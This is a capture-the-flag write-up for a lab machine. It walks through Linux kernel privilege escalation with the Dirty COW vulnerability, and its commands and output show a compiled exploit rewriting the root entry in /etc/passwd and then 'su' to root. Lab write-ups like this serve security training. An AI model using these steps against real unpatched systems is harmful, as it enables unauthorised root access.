# Writeup 2 - Dirty Cow

<br>

For this exploit, it is rather simple to set up once the vulnerability is found.

Indeed, Dirty COW (Dirty copy-on-write) is a computer security vulnerability of
the Linux kernel that affected all Linux-based operating systems, including
Android devices, that used older versions of the Linux kernel created before
2018 (Linux kernel 2 .x through 4.x before 4.8.3)

So we can connect to any user using ssh (look at
[Writeup1](https://github.com/A-Mahla/Security-Pentest-Part-II/blob/main/writeup1.md) -
`Step 5` / `Step 6` or `Step 7` to find some credential users).

```shell
target:~$ uname -r
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 athlon i386 GNU/Linux

```

As we can see, the kernel of this machine is `3.2.0-91-generic-pae`, so it
is vulnerable to `Dirty Cow`.

Just have to copy the file `dirty.c` on  provide in this repository
(`./scripts/`), run these commands to choose a new root password : 

```shell
laurie@BornToSecHackMe:~$  gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
root:fiVCtRKlZeVXY:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'boss'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'boss'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

You can now, connect on root user (uid(0)), with the password you choose :

```shell
laurie@BornToSecHackMe:~$ su
Password: 
root@BornToSecHackMe:/home/laurie# id
uid=0(root) gid=0(root) groups=0(root)
```

it's done !'




